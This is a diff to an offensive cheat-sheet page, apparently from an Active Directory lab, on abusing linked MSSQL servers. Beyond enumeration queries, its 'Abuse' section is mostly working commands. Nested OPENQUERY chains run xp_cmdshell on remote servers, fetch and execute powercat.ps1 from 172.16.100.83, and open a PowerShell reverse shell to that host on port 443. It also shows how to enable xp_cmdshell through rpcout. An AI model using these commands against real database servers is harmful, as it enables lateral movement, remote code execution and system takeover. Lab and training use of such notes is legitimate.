@@ -34,21 +34,37 @@ select * from master..sysservers
 # database links
 Get-SQLServerLinkCrawl -Instance dcorp-mssql 
 # Using HeidiSQL 
-select * from openquery("dcorp-sql1",'select * from openquery("dcorpmgmt",''select * from master..sysservers'')')
+select * from openquery("DCORP-SQL1", 'select * from openquery("DCORP-MGMT",''select * from master..sysservers'')')
 
 </code></pre>
 
 ## Abuse
 
-We can use links to execute commands across database links where sysAdmin is set to 1
+We can use links to execute commands across database links where Sysadmin set to 1
 
 ```powershell
 Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget eu-sql
 # Using HeidiSQL 
-select * from openquery("dcorp-sql1",'select * from openquery("dcorpmgmt",''select * from openquery("eu-sql.eu.eurocorp.local",''''select @@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')')
+SELECT *
+FROM OPENQUERY("dcorp-sql1", '
+    SELECT * 
+    FROM OPENQUERY("dcorp-mgmt", ''
+       SELECT *
+       FROM OPENQUERY("EU-SQL32.EU.EUROCORP.LOCAL",''''
+           SELECT @@version AS version;
+           EXEC master..xp_cmdshell "powershell iex (iwr http://172.16.100.83/powercat.ps1 -UseBasicParsing)";
+       '''') 
+    '')
+')
+
 
 # revshell example
 Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell "powershell iex ((New-Object Net.WebClient).DownloadString(''http://172.16.100.83/powercat.ps1;powercat -c 172.16.100.83 -p 443 -e powershell''));"' -QueryTarget eu-sql32
 
 ```
 
+In case that  `rpcout` is enabled (disabled by default), xp\_cmdshell can be enabled using:
+
+```sql
+EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"
+```
